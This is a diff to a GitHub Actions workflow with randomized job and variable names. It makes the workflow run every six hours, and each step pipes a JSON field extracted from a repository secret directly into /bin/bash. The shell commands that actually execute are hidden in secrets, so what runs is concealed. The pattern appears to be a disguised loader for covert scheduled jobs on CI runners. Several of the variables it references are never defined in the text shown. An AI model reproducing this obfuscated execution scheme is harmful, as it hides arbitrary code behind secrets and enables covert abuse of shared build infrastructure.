@@ -3,7 +3,8 @@ name: caizipei9713
 on:
   workflow_dispatch:
   schedule:
-    - cron: '6 5/6 * * *'
+    - cron: '21 3/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,11 +12,16 @@ jobs:
       - uses: actions/checkout@v4
       - name: caizipei9713
         env:
-          i039: ${{ secrets.i039 }}
+          ngp7824: ${{ secrets.ngp7824 }}
         run: |
-          echo $i039 | jq -r .xjq14841 | /bin/bash
-          echo $e6172 | jq -r .dr5481 | /bin/bash
-          echo $aacu3628 | jq -r .cuwh3 | /bin/bash
-          echo $fb8 | jq -r .ktikp272 | /bin/bash
-          echo $d96 | jq -r .vvh90315 | /bin/bash
+          echo $ngp7824 | jq -r .m73 | /bin/bash
+          echo $cekr85 | jq -r .yu35 | /bin/bash
+          echo $abj4 | jq -r .tiqs38164 | /bin/bash
+          echo $tle55217 | jq -r .jukp20130 | /bin/bash
+          echo $cs73 | jq -r .xzi675 | /bin/bash
+          echo $j27 | jq -r .irxep4 | /bin/bash
+          echo $u1610 | jq -r .a72290 | /bin/bash
+          echo $nmfq709 | jq -r .xxupx8 | /bin/bash
+          echo $n75575 | jq -r .ccv923 | /bin/bash
+          echo $z7 | jq -r .n7 | /bin/bash
 
